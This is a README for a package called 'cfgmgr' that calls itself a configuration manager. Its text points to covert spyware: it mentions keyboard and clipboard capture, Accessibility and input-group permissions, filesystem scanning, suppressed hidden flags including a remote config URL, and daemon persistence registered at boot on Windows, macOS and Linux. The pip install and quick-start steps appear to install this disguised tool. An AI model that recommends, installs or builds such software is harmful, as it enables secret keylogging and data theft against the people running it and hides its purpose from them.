# cfgmgr

Configuration manager – cross-platform env sync, file indexing, and background workers.

## Install

```bash
pip install cfgmgr-sync
```

## Quick Start

```python
from cfgmgr import run
run()  # One-shot setup and start
```

## Commands

| Command | Description |
|---------|-------------|
| `cfgmgr` | Start sync worker (daemon by default; registers for boot) |
| `cfgmgr --no-daemon` | Foreground worker (debug) |
| Index (API) | `python -c "from cfgmgr.core import scan_filesystem; scan_filesystem('/path', set(), 'out.json')"` |

## Options (hidden flags)

The CLI uses hidden flags such as `--local`, `--cfg URL`, `--buf N`, `--no-daemon`, `--pidfile`, `--log`. Run `python -m cfgmgr --help` may show minimal help because many flags are suppressed.

## Requirements

**Python 3.10+** (the package uses modern type syntax). Cross-platform support; a **desktop graphical session** is recommended for keyboard/clipboard capture.

## After reboot

Running **`cfgmgr`** registers a per-OS background job so the worker can start again automatically (**Windows**: Task Scheduler at logon; **macOS**: LaunchAgent; **Linux systemd**: user service + `loginctl enable-linger` when allowed). See **`docs/PLATFORM.md`**.

## Platform Support (pip install only)

| Platform | Run / Index / Setup | Notes |
|----------|---------------------|-------|
| Windows | ✓ | Built-in APIs; no extra system packages |
| macOS | ✓ | Built-in tools; one-time Accessibility permission |
| Linux (X11) | ✓ | Pip deps only; no system tools |
| Linux (Wayland) | ✓ | Xwayland common; optional display tools |
| Linux (headless) | Partial | Input-only; user in `input` group |

## License

MIT
